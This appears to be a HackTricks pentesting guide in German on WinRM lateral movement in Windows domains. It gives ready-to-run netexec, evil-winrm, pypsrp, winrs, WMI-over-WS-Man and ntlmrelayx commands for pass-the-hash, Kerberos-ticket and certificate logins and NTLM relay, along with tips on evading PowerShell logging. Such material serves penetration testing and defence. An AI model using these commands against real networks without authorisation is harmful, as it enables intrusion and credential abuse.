# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist eines der bequemsten **lateral movement**-Transports in Windows-Umgebungen, weil es dir eine Remote-Shell über **WS-Man/HTTP(S)** gibt, ohne dass SMB-Service-Creation-Tricks nötig sind. Wenn das Ziel **5985/5986** exponiert und dein Principal Remoting verwenden darf, kannst du oft sehr schnell von „valid creds“ zu „interactive shell“ wechseln.

Für die **protocol/service enumeration**, Listener, das Aktivieren von WinRM, `Invoke-Command` und allgemeine Client-Nutzung siehe:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Nutzt **HTTP/HTTPS** statt SMB/RPC, funktioniert also oft dort, wo PsExec-artige Ausführung blockiert ist.
- Mit **Kerberos** werden keine wiederverwendbaren Credentials an das Ziel gesendet.
- Funktioniert sauber von **Windows**, **Linux** und **Python**-Tooling aus (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Der interaktive PowerShell-Remoting-Pfad startet **`wsmprovhost.exe`** auf dem Ziel unter dem authentifizierten User-Kontext, was sich operativ von service-basierter Ausführung unterscheidet.

## Access model and prerequisites

In der Praxis hängt erfolgreiches WinRM lateral movement von **drei** Dingen ab:

1. Das Ziel hat einen **WinRM listener** (`5985`/`5986`) und Firewall-Regeln, die Zugriff erlauben.
2. Das Konto kann sich am Endpoint **authentifizieren**.
3. Das Konto darf eine **remoting session** öffnen.

Gängige Wege, um diesen Zugriff zu erhalten:

- **Local Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe noch berücksichtigen.
- Explizite Remoting-Rechte, die über lokale Security Descriptors / PowerShell remoting ACL-Änderungen delegiert wurden.

Wenn du bereits eine Box mit Admin-Rechten kontrollierst, denk daran, dass du WinRM-Zugriff auch **ohne vollständige Admin-Gruppenmitgliedschaft** delegieren kannst, indem du die hier beschriebenen Techniken verwendest:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Wenn du per IP verbindest, fällt der Client normalerweise auf **NTLM/Negotiate** zurück.
- In **workgroup**- oder Cross-Trust-Sonderfällen erfordert NTLM häufig entweder **HTTPS** oder dass das Ziel auf dem Client zu **TrustedHosts** hinzugefügt wird.
- Bei **local accounts** über Negotiate in einer workgroup können UAC remote restrictions den Zugriff verhindern, außer das integrierte Administrator-Konto wird verwendet oder `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting verwendet standardmäßig den **`HTTP/<host>` SPN**. In Umgebungen, in denen **`HTTP/<host>`** bereits einem anderen Service-Account zugewiesen ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen; verwende einen port-qualifizierten SPN oder wechsle zu **`WSMAN/<host>`**, falls dieser SPN existiert.

Wenn du beim Password Spraying gültige Credentials findest, ist das Validieren über WinRM oft der schnellste Weg zu prüfen, ob daraus eine Shell wird:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM für interaktive Shells

`evil-winrm` bleibt von Linux aus die bequemste interaktive Option, da es **Passwörter**, **NT-Hashes**, **Kerberos-Tickets**, **Client-Zertifikate**, Dateitransfer und das Laden von PowerShell/.NET im Speicher unterstützt.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN-Sonderfall: `HTTP` vs `WSMAN`

Wenn das standardmäßige **`HTTP/<host>`**-SPN Kerberos-Fehler verursacht, versuche stattdessen, ein **`WSMAN/<host>`**-Ticket anzufordern/zu verwenden. Das tritt in gehärteten oder ungewöhnlichen Enterprise-Setups auf, in denen `HTTP/<host>` bereits an ein anderes Servicekonto gebunden ist.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Das ist auch nach **RBCD / S4U**-Missbrauch nützlich, wenn du speziell ein **WSMAN**-Service-Ticket statt eines generischen `HTTP`-Tickets gefälscht oder angefordert hast.

### Certificate-based authentication

WinRM unterstützt auch **client certificate authentication**, aber das Zertifikat muss auf dem Ziel auf ein **local account** gemappt sein. Aus offensiver Sicht ist das relevant, wenn:

- du bereits ein gültiges client certificate und den private key gestohlen/exportiert hast, die für WinRM gemappt sind;
- du **AD CS / Pass-the-Certificate** missbraucht hast, um ein Zertifikat für einen Principal zu erhalten und dann in einen anderen authentication path zu pivoten;
- du in Umgebungen arbeitest, die bewusst password-based remoting vermeiden.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-Zertifikats-WinRM ist viel seltener als Passwort-/Hash-/Kerberos-Auth, aber wenn es vorhanden ist, kann es einen **passwortlosen lateral movement**-Pfad bieten, der Passwortrotation übersteht.

### Python / automation mit `pypsrp`

Wenn du Automation statt einer Operator-Shell brauchst, bietet `pypsrp` dir WinRM/PSRP aus Python mit **NTLM**, **certificate auth**, **Kerberos** und **CredSSP**-Support.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM command execution** möchtest, ohne eine interaktive PowerShell remoting session zu öffnen:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operationally führt `winrs.exe` häufig zu einer Remote-Prozesskette ähnlich wie:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dies ist es wert, sich zu merken, weil es sich von service-based exec und von interaktiven PSRP sessions unterscheidet.

### `winrm.cmd` / WS-Man COM statt PowerShell remoting

Du kannst auch über **WinRM transport** ausführen, ohne `Enter-PSSession` zu verwenden, indem du WMI-Klassen über WS-Man aufrufst. Dadurch bleibt der transport WinRM, während das Remote-Execution-Primitive zu **WMI `Win32_Process.Create`** wird:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Dieser Ansatz ist nützlich, wenn:

- PowerShell-Logging stark überwacht wird.
- Du **WinRM transport** möchtest, aber keinen klassischen PS-remoting-Workflow.
- Du eigene Tools rund um das **`WSMan.Automation`** COM-Objekt entwickelst oder verwendest.

## NTLM relay to WinRM (WS-Man)

Wenn SMB relay durch Signing blockiert ist und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** trotzdem ein attraktives relay-Ziel sein. Moderne `ntlmrelayx.py` enthält **WinRM relay servers** und kann zu **`wsman://`**- oder **`winrms://`**-Targets relayen.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der weitergeleitete Principal WinRM verwenden darf.
- Neuerer Impacket-Code behandelt **`WSMANIDENTIFY: unauthenticated`**-Requests speziell, sodass **`Test-WSMan`**-ähnliche Probes den Relay-Flow nicht unterbrechen.

Für Multi-Hop-Einschränkungen nach dem Erhalt einer ersten WinRM-Session, siehe:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC- und Detection-Hinweise

- **Interaktives PowerShell-Remoting** erstellt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erstellt üblicherweise **`winrshost.exe`** und danach den angeforderten Child-Process.
- Rechne mit **Network-Logon**-Telemetry, WinRM-Service-Events und PowerShell Operational-/Script-Block-Logging, wenn du PSRP statt rohem `cmd.exe` verwendest.
- Wenn du nur einen einzelnen Befehl brauchst, kann `winrs.exe` oder eine einmalige WinRM-Ausführung unauffälliger sein als eine langlebige interaktive Remoting-Session.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** statt IP + NTLM, um sowohl Trust-Probleme als auch umständliche clientseitige `TrustedHosts`-Änderungen zu reduzieren.

## Referenzen

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
